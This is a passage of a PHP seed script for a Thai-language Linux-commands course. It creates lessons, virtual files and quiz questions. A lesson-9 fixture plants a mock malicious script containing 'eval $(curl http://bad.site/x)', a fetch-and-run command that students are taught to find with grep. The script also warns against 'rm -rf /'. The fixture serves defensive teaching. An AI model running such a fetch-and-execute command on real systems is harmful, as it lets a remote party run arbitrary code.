<?php
declare(strict_types=1);

/**
 * One-time content seed for LinuxQuest LMS.
 * Run: php database/seed.php   (after importing database/schema.sql)
 *
 * Lesson/quiz/game/drill content is transcribed from the Claude Design
 * prototype (project/LinuxQuest LMS.dc.html — LESSONS/PRE/POST/GAMES/DRILLS
 * constants). The 3-question "lesson quiz" gating each lesson is new (the
 * prototype only had one course-level pre-test and post-test); it reuses
 * existing PRE/POST bank questions grouped by topic, supplemented with a
 * small number of freshly authored questions (documented inline) where the
 * bank didn't have 3 matching items for a topic.
 */

require_once __DIR__ . '/../config/config.php';
require_once __DIR__ . '/../src/Database.php';

$db = Database::get();
echo "Seeding LinuxQuest LMS...\n";

$db->exec('SET FOREIGN_KEY_CHECKS=0');
foreach (['certificates', 'game_scores', 'games', 'drills', 'quiz_answers', 'quiz_attempts', 'quiz_options',
    'quiz_questions', 'quizzes', 'user_lesson_progress', 'lesson_tasks', 'lesson_hints', 'lesson_examples',
    'lesson_points', 'lessons', 'courses', 'users'] as $t) {
    $db->exec("TRUNCATE TABLE `$t`");
}
$db->exec('SET FOREIGN_KEY_CHECKS=1');

// ---------------------------------------------------------------- helpers
function d(array $ch = [], string $p = 'rwxr-xr-x'): array { return ['t' => 'd', 'ch' => $ch, 'p' => $p]; }
function f(string $c = '', string $p = 'rw-r--r--'): array { return ['t' => 'f', 'c' => $c, 'p' => $p]; }

function lessonVfs(int $n): array
{
    $base = [
        'documents' => d(['report.txt' => f("รายงานวิชา Linux\nส่งวันศุกร์")]),
        'downloads' => d([]),
        'notes.txt' => f("TODO: อ่านบทที่ 6\nTODO: ส่งงาน Linux\nTODO: ฝึกใช้ grep"),
        '.bashrc' => f('export PATH=$PATH:/usr/local/bin'),
    ];
    if ($n === 5) {
        $base['trash'] = d(['old.log' => f('deprecated'), 'temp.txt' => f('tmp')]);
        $base['empty'] = d([]);
    }
    if ($n === 6) {
        $base['system.log'] = f("[OK] boot sequence started\n[OK] network up\n[WARN] disk 82% full\n[OK] service sshd running\n[INFO] user student login");
    }
    if ($n === 8) {
        $base['script.sh'] = f("#!/bin/bash\necho hello", 'rw-r--r--');
        $base['secret.txt'] = f('รหัสผ่าน wifi: 12345678', 'rw-r--r--');
    }
    if ($n === 9) {
        $base['scripts'] = d(['backup.sh' => f("#!/bin/bash\ntar -czf backup.tar.gz /home/student"), 'clean.sh' => f("#!/bin/bash\nrm -rf /tmp/*")]);
        $base['downloads'] = d(['update.sh' => f("#!/bin/bash\neval \$(curl http://bad.site/x)")]);
        $base['notes.txt'] = f("TODO: อ่านบทที่ 9\nTODO: ตรวจ eval ในสคริปต์");
    }
    return d(['home' => d(['student' => d($base)])]);
}

// ---------------------------------------------------------------- course
$db->prepare('INSERT INTO courses (id, code, title_th, title_en, description) VALUES (1,?,?,?,?)')->execute([
    COURSE_CODE, 'คำสั่งพื้นฐาน Linux', 'Basic Linux Commands',
    'เรียนคำสั่งที่ใช้จริงในการทำงานผ่าน Terminal จำลองในเบราว์เซอร์ แล้วปิดท้ายด้วยเกมฝึกทักษะและภารกิจกู้ระบบ',
]);
$courseId = 1;

// ---------------------------------------------------------------- lessons
$LESSONS = [
    [
        'n' => 1, 'cmds' => 'pwd / ls', 'th' => 'รู้ว่าเราอยู่ที่ไหน และมีอะไรอยู่ตรงนั้น', 'en' => 'Where am I? What is here?',
        'blurb' => 'อ่านตำแหน่งปัจจุบันและรายการไฟล์', 'xp' => 40,
        'intro' => 'ก่อนจะสั่งอะไรได้ ต้องรู้ก่อนว่าตอนนี้เรา "ยืน" อยู่ตรงไหนของระบบไฟล์ ลองนึกถึง File Explorer ใน Windows — แถบ address bar ด้านบนบอกตำแหน่ง และรายการไฟล์ตรงกลางคือสิ่งที่อยู่ในโฟลเดอร์นั้น บน Linux สองสิ่งนี้คือคำสั่ง pwd และ ls',
        'warn' => 'ls กับ ls -l ให้ข้อมูลคนละระดับ ถ้าอยากรู้ว่าอันไหนเป็นโฟลเดอร์ ให้ดูตัวอักษรตัวแรกของ ls -l : d = directory, - = file',
        'points' => [
            ['cmd' => 'pwd', 'desc' => 'Print Working Directory — พิมพ์ path เต็มของตำแหน่งที่เราอยู่ตอนนี้'],
            ['cmd' => 'ls', 'desc' => 'List — แสดงรายชื่อไฟล์และโฟลเดอร์ในตำแหน่งปัจจุบัน'],
            ['cmd' => 'ls -l', 'desc' => 'แสดงแบบละเอียด (long) เห็นสิทธิ์ ขนาด และชนิดของแต่ละรายการ'],
            ['cmd' => 'ls -a', 'desc' => 'แสดงไฟล์ซ่อนด้วย (ไฟล์ที่ชื่อขึ้นต้นด้วยจุด เช่น .bashrc)'],
        ],
        'ex' => [
            ['text' => '$ pwd', 'c' => 'green'], ['text' => '/home/student', 'c' => 'txt'],
            ['text' => '$ ls', 'c' => 'green'], ['text' => 'documents  downloads  notes.txt', 'c' => 'txt'],
            ['text' => '$ ls -l', 'c' => 'green'], ['text' => 'drwxr-xr-x  documents', 'c' => 'dim'],
            ['text' => '-rw-r--r--  notes.txt', 'c' => 'dim'],
        ],
        'hints' => ['pwd', 'ls', 'ls -l', 'ls -a'],
        'tasks' => [
            ['label' => 'ใช้ pwd ดูว่าตอนนี้อยู่ไดเรกทอรีไหน', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^pwd$/']],
            ['label' => 'ใช้ ls ดูรายการไฟล์', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^ls$/']],
            ['label' => 'ใช้ ls -l ดูรายละเอียดพร้อมสิทธิ์', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^ls\s+-l/']],
            ['label' => 'ใช้ ls -a หาไฟล์ซ่อน', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^ls\s+-a/']],
        ],
    ],
    [
        'n' => 2, 'cmds' => 'cd', 'th' => 'เดินไปมาระหว่างโฟลเดอร์', 'en' => 'Change Directory',
        'blurb' => 'path สัมบูรณ์ vs path สัมพัทธ์', 'xp' => 40,
        'intro' => 'cd คือการ "ดับเบิลคลิกเข้าโฟลเดอร์" ในภาษา command line มีสองวิธีระบุปลายทาง: absolute path เริ่มด้วย / เสมอ (บอกจากรากของระบบ) และ relative path ที่นับจากตำแหน่งที่ยืนอยู่ตอนนี้',
        'warn' => 'พิมพ์ cd เฉย ๆ ไม่ใส่อะไร = กลับ home เหมือน cd ~ และ Linux แยกตัวพิมพ์ใหญ่-เล็ก Documents กับ documents คนละโฟลเดอร์กัน',
        'points' => [
            ['cmd' => 'cd <โฟลเดอร์>', 'desc' => 'เข้าไปในโฟลเดอร์ย่อยที่ระบุ'],
            ['cmd' => 'cd ..', 'desc' => 'ถอยขึ้นไปหนึ่งระดับ (โฟลเดอร์แม่)'],
            ['cmd' => 'cd ~', 'desc' => 'กลับ home directory ของตัวเองทันที ไม่ว่าจะอยู่ลึกแค่ไหน'],
            ['cmd' => 'cd /etc', 'desc' => 'ตัวอย่าง absolute path — เริ่มด้วย / คือนับจากรากของระบบ'],
        ],
        'ex' => [
            ['text' => '$ cd documents', 'c' => 'green'], ['text' => '$ pwd', 'c' => 'green'],
            ['text' => '/home/student/documents', 'c' => 'txt'], ['text' => '$ cd ..', 'c' => 'green'],
            ['text' => '$ pwd', 'c' => 'green'], ['text' => '/home/student', 'c' => 'txt'],
        ],
        'hints' => ['cd documents', 'pwd', 'cd ..', 'cd ~'],
        'tasks' => [
            ['label' => 'เข้าไปในโฟลเดอร์ documents', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^cd\s+documents/']],
            ['label' => 'ยืนยันตำแหน่งใหม่ด้วย pwd', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^pwd$/']],
            ['label' => 'ถอยกลับด้วย cd ..', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^cd\s+\.\./']],
            ['label' => 'กลับ home ด้วย cd ~ หรือ cd', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^cd(\s+~)?$/']],
        ],
    ],
    [
        'n' => 3, 'cmds' => 'mkdir / touch', 'th' => 'สร้างโฟลเดอร์และไฟล์', 'en' => 'Make directory & create file',
        'blurb' => 'เตรียมที่เก็บงานของตัวเอง', 'xp' => 45,
        'intro' => 'เมื่อเดินไปมาเป็นแล้ว ขั้นถัดไปคือสร้างของใหม่ mkdir สร้างโฟลเดอร์ ส่วน touch สร้างไฟล์เปล่า (จริง ๆ touch มีหน้าที่อัปเดตเวลาแก้ไขไฟล์ แต่ถ้าไฟล์ยังไม่มี มันจะสร้างให้)',
        'warn' => 'ถ้าโฟลเดอร์ชื่อนั้นมีอยู่แล้ว mkdir จะแจ้ง error ไม่เขียนทับ — ถือเป็นข้อดี เพราะกันงานเราหายโดยไม่ตั้งใจ',
        'points' => [
            ['cmd' => 'mkdir <ชื่อ>', 'desc' => 'สร้างโฟลเดอร์ใหม่ในตำแหน่งปัจจุบัน'],
            ['cmd' => 'mkdir -p a/b/c', 'desc' => 'สร้างซ้อนหลายชั้นในครั้งเดียว ถ้าชั้นแม่ยังไม่มีก็สร้างให้'],
            ['cmd' => 'touch <ไฟล์>', 'desc' => 'สร้างไฟล์เปล่า หรืออัปเดตเวลาแก้ไขถ้าไฟล์มีอยู่แล้ว'],
            ['cmd' => 'echo "ข้อความ" > ไฟล์', 'desc' => 'เขียนข้อความลงไฟล์ (เครื่องหมาย > คือเขียนทับ)'],
        ],
        'ex' => [
            ['text' => '$ mkdir project', 'c' => 'green'], ['text' => '$ cd project', 'c' => 'green'],
            ['text' => '$ touch main.py', 'c' => 'green'], ['text' => '$ ls', 'c' => 'green'], ['text' => 'main.py', 'c' => 'txt'],
        ],
        'hints' => ['mkdir project', 'cd project', 'touch main.py', 'ls'],
        'tasks' => [
            ['label' => 'สร้างโฟลเดอร์ชื่อ project', 'rule_type' => 'vfs_path_exists', 'rule_params' => ['path' => ['~', 'project']]],
            ['label' => 'สร้างไฟล์ main.py ไว้ข้างใน project', 'rule_type' => 'vfs_path_exists', 'rule_params' => ['path' => ['~', 'project', 'main.py']]],
            ['label' => 'ตรวจผลด้วย ls', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^ls/']],
        ],
    ],
    [
        'n' => 4, 'cmds' => 'cp / mv', 'th' => 'คัดลอก ย้าย และเปลี่ยนชื่อ', 'en' => 'Copy, move & rename',
        'blurb' => 'mv ทำได้ทั้งย้ายและเปลี่ยนชื่อ', 'xp' => 50,
        'intro' => 'cp คือ copy-paste ส่วน mv คือ cut-paste — และเคล็ดลับที่หลายคนไม่รู้: การเปลี่ยนชื่อไฟล์บน Linux ก็ใช้ mv นี่แหละ เพราะ "ย้ายไฟล์ไปยังชื่อใหม่ในที่เดิม" มีความหมายเท่ากับการเปลี่ยนชื่อ',
        'warn' => 'ทั้ง cp และ mv จะเขียนทับไฟล์ปลายทางเงียบ ๆ ถ้าชื่อซ้ำ ใส่ -i เพื่อให้ถามยืนยันก่อนทุกครั้งจะปลอดภัยกว่ามาก',
        'points' => [
            ['cmd' => 'cp ต้นทาง ปลายทาง', 'desc' => 'คัดลอกไฟล์ ต้นฉบับยังอยู่ที่เดิม'],
            ['cmd' => 'cp -r โฟลเดอร์ ปลายทาง', 'desc' => 'คัดลอกทั้งโฟลเดอร์ ต้องใส่ -r (recursive) เสมอ'],
            ['cmd' => 'mv ไฟล์ โฟลเดอร์/', 'desc' => 'ย้ายไฟล์เข้าไปในโฟลเดอร์'],
            ['cmd' => 'mv เก่า.txt ใหม่.txt', 'desc' => 'เปลี่ยนชื่อไฟล์ — ปลายทางเป็นชื่อไฟล์ใหม่ในที่เดิม'],
        ],
        'ex' => [
            ['text' => '$ cp notes.txt backup.txt', 'c' => 'green'], ['text' => '$ mv backup.txt documents/', 'c' => 'green'],
            ['text' => '$ mv notes.txt todo.txt', 'c' => 'green'], ['text' => '$ ls', 'c' => 'green'],
            ['text' => 'documents  downloads  todo.txt', 'c' => 'txt'],
        ],
        'hints' => ['cp notes.txt backup.txt', 'mv backup.txt documents/', 'mv notes.txt todo.txt', 'ls'],
        'tasks' => [
            ['label' => 'คัดลอก notes.txt เป็น backup.txt', 'rule_type' => 'vfs_path_exists_any', 'rule_params' => ['paths' => [['~', 'backup.txt'], ['~', 'documents', 'backup.txt']]]],
            ['label' => 'ย้าย backup.txt เข้าโฟลเดอร์ documents', 'rule_type' => 'vfs_path_exists', 'rule_params' => ['path' => ['~', 'documents', 'backup.txt']]],
            ['label' => 'เปลี่ยนชื่อ notes.txt เป็น todo.txt', 'rule_type' => 'vfs_path_exists', 'rule_params' => ['path' => ['~', 'todo.txt']]],
        ],
    ],
    [
        'n' => 5, 'cmds' => 'rm / rmdir', 'th' => 'ลบให้เป็น ลบให้ปลอดภัย', 'en' => 'Remove files & directories',
        'blurb' => 'คำสั่งที่ต้องระวังที่สุด', 'xp' => 45,
        'intro' => 'บน Linux ไม่มีถังขยะให้กู้คืน — rm คือลบถาวรทันที นี่คือคำสั่งที่ต้องคิดสองรอบก่อนกด Enter ทุกครั้ง วิธีที่ปลอดภัยคือ ls ดูก่อนเสมอว่าจะลบอะไร',
        'warn' => 'อย่าพิมพ์ rm -rf / เด็ดขาด มันคือคำสั่งลบทั้งระบบ และห้ามลอกคำสั่งลบจากอินเทอร์เน็ตมาวางโดยไม่อ่านให้เข้าใจก่อน',
        'points' => [
            ['cmd' => 'rm <ไฟล์>', 'desc' => 'ลบไฟล์ถาวร ไม่มีถังขยะ ไม่มี Ctrl+Z'],
            ['cmd' => 'rm -r <โฟลเดอร์>', 'desc' => 'ลบโฟลเดอร์พร้อมทุกอย่างข้างใน'],
            ['cmd' => 'rmdir <โฟลเดอร์>', 'desc' => 'ลบเฉพาะโฟลเดอร์ว่าง — ปลอดภัยกว่า rm -r เพราะถ้ามีของอยู่มันจะไม่ยอมลบ'],
            ['cmd' => 'rm -i <ไฟล์>', 'desc' => 'ถามยืนยันก่อนลบทีละไฟล์'],
        ],
        'ex' => [
            ['text' => '$ ls trash', 'c' => 'green'], ['text' => 'old.log  temp.txt', 'c' => 'txt'],
            ['text' => '$ rm trash/old.log', 'c' => 'green'], ['text' => '$ rm -r trash', 'c' => 'green'],
            ['text' => '$ ls', 'c' => 'green'], ['text' => 'documents  downloads', 'c' => 'txt'],
        ],
        'hints' => ['ls trash', 'rm trash/old.log', 'rmdir empty', 'rm -r trash'],
        'tasks' => [
            ['label' => 'ดูข้างในโฟลเดอร์ trash ก่อนลบ', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^ls\s+trash/']],
            ['label' => 'ลบไฟล์ trash/old.log', 'rule_type' => 'all_of', 'rule_params' => ['rules' => [
                ['type' => 'vfs_path_absent', 'params' => ['path' => ['~', 'trash', 'old.log']]],
                ['type' => 'history_regex', 'params' => ['pattern' => '/^rm\b/']],
            ]]],
            ['label' => 'ลบโฟลเดอร์ว่างชื่อ empty ด้วย rmdir', 'rule_type' => 'all_of', 'rule_params' => ['rules' => [
                ['type' => 'vfs_path_absent', 'params' => ['path' => ['~', 'empty']]],
                ['type' => 'history_regex', 'params' => ['pattern' => '/^rmdir\b/']],
            ]]],
        ],
    ],
    [
        'n' => 6, 'cmds' => 'cat / head / less', 'th' => 'อ่านไฟล์โดยไม่ต้องเปิดโปรแกรม', 'en' => 'Read file contents',
        'blurb' => 'ดูเนื้อหาไฟล์ตรงจาก terminal', 'xp' => 45,
        'intro' => 'ถ้าใน Windows คุณดับเบิลคลิกให้ Notepad เปิด file1.txt บน command line คุณใช้ cat แทน — มันพ่นเนื้อหาทั้งไฟล์ออกมาบนหน้าจอเลย ส่วนไฟล์ยาว ๆ เช่น log ใช้ head ดูแค่ต้นไฟล์จะเร็วกว่ามาก',
        'warn' => 'อย่า cat ไฟล์ใหญ่มาก ๆ หรือไฟล์ไบนารี เพราะจะพ่นข้อความรัวเต็มหน้าจอจนอ่านไม่ทัน ใช้ head หรือ less แทน',
        'points' => [
            ['cmd' => 'cat <ไฟล์>', 'desc' => 'แสดงเนื้อหาไฟล์ทั้งหมด เหมาะกับไฟล์สั้น'],
            ['cmd' => 'head -n 5 <ไฟล์>', 'desc' => 'ดู 5 บรรทัดแรก'],
            ['cmd' => 'tail -n 5 <ไฟล์>', 'desc' => 'ดู 5 บรรทัดสุดท้าย เหมาะกับดู log ล่าสุด'],
            ['cmd' => 'less <ไฟล์>', 'desc' => 'เปิดอ่านแบบเลื่อนทีละหน้า กด q เพื่อออก'],
        ],
        'ex' => [
            ['text' => '$ cat notes.txt', 'c' => 'green'], ['text' => 'TODO: อ่านบทที่ 6', 'c' => 'txt'],
            ['text' => 'TODO: ส่งงาน Linux', 'c' => 'txt'], ['text' => '$ head -n 2 system.log', 'c' => 'green'],
            ['text' => '[OK] boot sequence started', 'c' => 'dim'],
        ],
        'hints' => ['ls', 'cat notes.txt', 'head -n 2 system.log', 'tail -n 2 system.log'],
        'tasks' => [
            ['label' => 'อ่าน notes.txt ด้วย cat', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^cat\s+notes\.txt/']],
            ['label' => 'ดูต้นไฟล์ system.log ด้วย head', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^head\b/']],
            ['label' => 'ดูท้ายไฟล์ด้วย tail', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^tail\b/']],
        ],
    ],
    [
        'n' => 7, 'cmds' => 'man / --help', 'th' => 'ช่วยตัวเองเป็น คือทักษะที่สำคัญที่สุด', 'en' => 'Read the manual',
        'blurb' => 'ไม่ต้องท่อง แค่รู้ว่าจะเปิดดูที่ไหน', 'xp' => 35,
        'intro' => 'ไม่มีใครจำ option ของทุกคำสั่งได้ และไม่จำเป็นต้องจำ สิ่งที่มืออาชีพทำคือเปิดคู่มือ man ซึ่งติดตั้งมาพร้อมระบบอยู่แล้ว ทำงานได้แม้ไม่มีอินเทอร์เน็ต',
        'warn' => 'อ่าน man ให้ดูสามส่วนพอ: NAME (มันทำอะไร) SYNOPSIS (พิมพ์ยังไง) และ OPTIONS เฉพาะตัวที่จะใช้ ไม่ต้องอ่านทั้งหน้า',
        'points' => [
            ['cmd' => 'man ls', 'desc' => 'เปิดคู่มือฉบับเต็มของคำสั่ง ls กด q เพื่อออก'],
            ['cmd' => 'ls --help', 'desc' => 'สรุป option แบบสั้น ๆ อ่านเร็วกว่า man'],
            ['cmd' => 'whatis <คำสั่ง>', 'desc' => 'อธิบายหน้าที่ของคำสั่งแบบบรรทัดเดียว'],
            ['cmd' => 'help', 'desc' => 'ในระบบจำลองนี้ใช้ help เพื่อดูคำสั่งที่รองรับทั้งหมด'],
        ],
        'ex' => [
            ['text' => '$ man ls', 'c' => 'green'], ['text' => 'NAME', 'c' => 'dim'],
            ['text' => '    ls - list directory contents', 'c' => 'txt'], ['text' => 'OPTIONS', 'c' => 'dim'],
            ['text' => '    -l  use a long listing format', 'c' => 'txt'],
        ],
        'hints' => ['man ls', 'man rm', 'ls --help', 'help'],
        'tasks' => [
            ['label' => 'เปิดคู่มือของ ls ด้วย man ls', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^man\s+ls/']],
            ['label' => 'เปิดคู่มือของคำสั่งอื่นอีกหนึ่งคำสั่ง', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^man\s+\S+/', 'min' => 2]],
            ['label' => 'ลองใช้ --help กับคำสั่งใดก็ได้', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/--help/']],
        ],
    ],
    [
        'n' => 8, 'cmds' => 'chmod', 'th' => 'สิทธิ์ไฟล์ ใครทำอะไรได้บ้าง', 'en' => 'File permissions',
        'blurb' => 'อ่าน rwx และเลข 755 ให้เป็น', 'xp' => 55,
        'intro' => 'ทุกไฟล์บน Linux มีสิทธิ์กำกับ 3 กลุ่ม: เจ้าของ (user) กลุ่ม (group) และคนอื่น (others) แต่ละกลุ่มมี 3 สิทธิ์คือ r=อ่าน w=เขียน x=รัน สิ่งที่ ls -l แสดงหน้าสุดเช่น -rwxr-xr-x คือข้อมูลชุดนี้',
        'warn' => 'อย่าใช้ chmod 777 กับทุกอย่างเพื่อให้ "มันทำงานสักที" — นั่นคือเปิดให้ทุกคนแก้และรันไฟล์ได้ เป็นช่องโหว่ความปลอดภัยอันดับต้น ๆ',
        'points' => [
            ['cmd' => 'ls -l', 'desc' => 'ดูสิทธิ์ปัจจุบัน อ่านทีละ 3 ตัวอักษร: user | group | others'],
            ['cmd' => 'chmod +x script.sh', 'desc' => 'เพิ่มสิทธิ์รัน (execute) ให้ไฟล์สคริปต์'],
            ['cmd' => 'chmod 755 script.sh', 'desc' => 'ตั้งสิทธิ์ด้วยเลขฐานแปด: r=4 w=2 x=1 → 7=rwx, 5=r-x'],
            ['cmd' => 'chmod 600 secret.txt', 'desc' => 'เจ้าของอ่านเขียนได้ คนอื่นเปิดไม่ได้เลย เหมาะกับไฟล์ลับ'],
        ],
        'ex' => [
            ['text' => '$ ls -l script.sh', 'c' => 'green'], ['text' => '-rw-r--r--  script.sh', 'c' => 'dim'],
            ['text' => '$ chmod +x script.sh', 'c' => 'green'], ['text' => '$ ls -l script.sh', 'c' => 'green'],
            ['text' => '-rwxr-xr-x  script.sh', 'c' => 'txt'],
        ],
        'hints' => ['ls -l', 'chmod +x script.sh', 'chmod 600 secret.txt', 'ls -l'],
        'tasks' => [
            ['label' => 'ดูสิทธิ์ปัจจุบันด้วย ls -l', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^ls\s+-l/']],
            ['label' => 'ทำให้ script.sh รันได้ด้วย chmod +x', 'rule_type' => 'vfs_perm_check', 'rule_params' => ['path' => ['~', 'script.sh'], 'contains' => 'x']],
            ['label' => 'ปิดสิทธิ์ secret.txt ด้วย chmod 600', 'rule_type' => 'vfs_perm_check', 'rule_params' => ['path' => ['~', 'secret.txt'], 'perm' => 'rw-------']],
        ],
    ],
    [
        'n' => 9, 'cmds' => 'grep / find', 'th' => 'ค้นหาไฟล์และค้นหาข้อความ', 'en' => 'Search files & text',
        'blurb' => 'ทักษะหลักก่อนเข้าเกมล่าไวรัส', 'xp' => 60,
        'intro' => 'สองคำสั่งนี้คืออาวุธของงานสืบสวนระบบ: find ใช้ตามหา "ไฟล์" จากชื่อหรือเงื่อนไข ส่วน grep ใช้ค้นหา "ข้อความข้างในไฟล์" เมื่อใช้เป็นแล้วคุณพร้อมเข้าเกมล่าไวรัสในบทถัดไป',
        'warn' => 'find ต้องระบุจุดเริ่มต้นเสมอ — จุด (.) หมายถึงเริ่มจากที่นี่ ถ้าใช้ / จะไล่ทั้งเครื่องซึ่งช้ามาก และอย่าลืมครอบ pattern ด้วยเครื่องหมายคำพูด',
        'points' => [
            ['cmd' => 'find . -name "*.log"', 'desc' => 'ค้นหาไฟล์นามสกุล .log ตั้งแต่ตำแหน่งปัจจุบันลงไปทุกชั้น'],
            ['cmd' => 'find . -name "*.sh"', 'desc' => 'เปลี่ยน pattern เป็นชนิดไฟล์ที่ต้องการ ใช้ * แทนอะไรก็ได้'],
            ['cmd' => 'grep "คำ" ไฟล์', 'desc' => 'หาบรรทัดที่มีคำนั้นในไฟล์'],
            ['cmd' => 'grep -r "คำ" .', 'desc' => 'ค้นหาแบบไล่ลงทุกโฟลเดอร์ (recursive) — ใช้ตามล่าโค้ดต้องสงสัย'],
        ],
        'ex' => [
            ['text' => '$ find . -name "*.sh"', 'c' => 'green'], ['text' => './scripts/backup.sh', 'c' => 'txt'],
            ['text' => './downloads/update.sh', 'c' => 'txt'], ['text' => '$ grep -r "eval" .', 'c' => 'green'],
            ['text' => './downloads/update.sh: eval $(curl bad.site)', 'c' => 'red'],
        ],
        'hints' => ['find . -name "*.sh"', 'grep -r "eval" .', 'grep "TODO" notes.txt', 'ls -l'],
        'tasks' => [
            ['label' => 'ใช้ find หาไฟล์ .sh ทั้งหมด', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^find\b.*\.sh/']],
            ['label' => 'ใช้ grep ค้นข้อความในไฟล์เดียว', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^grep\s+(?!-r)/']],
            ['label' => 'ใช้ grep -r ค้นทั้งโฟลเดอร์', 'rule_type' => 'history_regex', 'rule_params' => ['pattern' => '/^grep\s+-r/']],
        ],
    ],
];

$lessonIdByN = [];
$lessonStmt = $db->prepare('INSERT INTO lessons (course_id, position, commands_summary, title_th, title_en, blurb, intro, warn_text, xp_reward, vfs_seed) VALUES (?,?,?,?,?,?,?,?,?,?)');
$pointStmt = $db->prepare('INSERT INTO lesson_points (lesson_id, position, cmd, description) VALUES (?,?,?,?)');
$exStmt = $db->prepare('INSERT INTO lesson_examples (lesson_id, position, text_line, color_tag) VALUES (?,?,?,?)');
$hintStmt = $db->prepare('INSERT INTO lesson_hints (lesson_id, position, text_hint) VALUES (?,?,?)');
$taskStmt = $db->prepare('INSERT INTO lesson_tasks (lesson_id, position, label, rule_type, rule_params) VALUES (?,?,?,?,?)');

foreach ($LESSONS as $L) {
    $lessonStmt->execute([$courseId, $L['n'], $L['cmds'], $L['th'], $L['en'], $L['blurb'], $L['intro'], $L['warn'], $L['xp'], json_encode(lessonVfs($L['n']), JSON_UNESCAPED_UNICODE)]);
    $lessonId = (int)$db->lastInsertId();
    $lessonIdByN[$L['n']] = $lessonId;

    foreach ($L['points'] as $i => $p) $pointStmt->execute([$lessonId, $i + 1, $p['cmd'], $p['desc']]);
    foreach ($L['ex'] as $i => $e) $exStmt->execute([$lessonId, $i + 1, $e['text'], $e['c']]);
    foreach ($L['hints'] as $i => $h) $hintStmt->execute([$lessonId, $i + 1, $h]);
    foreach ($L['tasks'] as $i => $t) $taskStmt->execute([$lessonId, $i + 1, $t['label'], $t['rule_type'], json_encode($t['rule_params'], JSON_UNESCAPED_UNICODE)]);
}
echo "  lessons: " . count($LESSONS) . "\n";

// ---------------------------------------------------------------- pre/post test bank
$PRE = [
    ['q' => 'คำสั่งใดใช้ดูว่าขณะนี้เราอยู่ไดเรกทอรีใด', 'o' => ['pwd', 'cd', 'ls', 'dir'], 'a' => 0, 'e' => 'pwd ย่อจาก Print Working Directory จะพิมพ์ path เต็มของตำแหน่งปัจจุบันออกมา', 'mono' => true],
    ['q' => 'คำสั่ง ls ทำหน้าที่อะไร', 'o' => ['ลบไฟล์', 'แสดงรายชื่อไฟล์และโฟลเดอร์', 'สร้างโฟลเดอร์', 'คัดลอกไฟล์'], 'a' => 1, 'e' => 'ls ย่อจาก list ใช้แสดงรายการสิ่งที่อยู่ในไดเรกทอรีปัจจุบัน'],
    ['q' => 'ต้องการถอยกลับไปยังโฟลเดอร์แม่ ใช้คำสั่งใด', 'o' => ['cd -', 'cd ..', 'cd ~', 'cd /'], 'a' => 1, 'e' => 'จุดสองจุด (..) หมายถึงไดเรกทอรีระดับบนหนึ่งชั้น ส่วน cd ~ คือกลับ home', 'mono' => true],
    ['q' => 'คำสั่งใดใช้สร้างโฟลเดอร์ใหม่', 'o' => ['touch', 'newdir', 'mkdir', 'create'], 'a' => 2, 'e' => 'mkdir ย่อจาก make directory ส่วน touch ใช้สร้างไฟล์เปล่า', 'mono' => true],
    ['q' => 'ในระบบ Linux การเปลี่ยนชื่อไฟล์ใช้คำสั่งใด', 'o' => ['rename', 'mv', 'cp', 'ren'], 'a' => 1, 'e' => 'mv ใช้ได้ทั้งย้ายและเปลี่ยนชื่อ เพราะการย้ายไปยังชื่อใหม่ในที่เดิมคือการเปลี่ยนชื่อนั่นเอง', 'mono' => true],
    ['q' => 'คำสั่ง rm -r มีความหมายว่าอย่างไร', 'o' => ['ลบไฟล์แล้วกู้คืนได้', 'ลบโฟลเดอร์พร้อมทุกอย่างข้างใน', 'ลบเฉพาะโฟลเดอร์ว่าง', 'เปลี่ยนชื่อไฟล์'], 'a' => 1, 'e' => '-r คือ recursive ลบไล่ลงไปทุกชั้น เป็นคำสั่งอันตรายเพราะ Linux ไม่มีถังขยะ'],
    ['q' => 'ต้องการดูเนื้อหาไฟล์ notes.txt บนหน้าจอ ใช้คำสั่งใด', 'o' => ['cat notes.txt', 'open notes.txt', 'read notes.txt', 'show notes.txt'], 'a' => 0, 'e' => 'cat ใช้พ่นเนื้อหาไฟล์ออกทางหน้าจอ เหมาะกับไฟล์ขนาดสั้น', 'mono' => true],
    // ข้อของบทที่ 7 (man/--help) — เดิมตรงนี้เป็นข้อ ls -l ของบทที่ 1 ซึ่งบทที่ 1 มีวัดอยู่แล้ว 2 ข้อ
    // ทำให้แบบทดสอบก่อนเรียนไม่มีข้อวัดบทที่ 7 เลย (ข้อ ls -l ย้ายไปอยู่ในแบบทดสอบท้ายบทที่ 1)
    ['q' => 'ต้องการอ่านคู่มือฉบับเต็มของคำสั่ง ls ใช้คำสั่งใด', 'o' => ['help ls', 'man ls', 'ls --manual', 'guide ls'], 'a' => 1, 'e' => 'man <คำสั่ง> เปิดคู่มือฉบับเต็มที่ติดมากับระบบ อ่านได้แม้ไม่มีอินเทอร์เน็ต กด q เพื่อออกจากหน้าคู่มือ', 'mono' => true],
    ['q' => 'สิทธิ์ -rwxr-xr-x หมายความว่าอย่างไร', 'code' => "-rwxr-xr-x  1 student student  script.sh", 'o' => ['ทุกคนแก้ไขไฟล์นี้ได้', 'เจ้าของอ่าน เขียน รันได้ คนอื่นอ่านและรันได้แต่แก้ไม่ได้', 'ไม่มีใครรันไฟล์นี้ได้', 'เฉพาะ root เท่านั้นที่เข้าถึงได้'], 'a' => 1, 'e' => 'อ่านทีละ 3 ตัว: rwx (เจ้าของ) r-x (กลุ่ม) r-x (คนอื่น) — w ที่หายไปคือเขียนไม่ได้'],
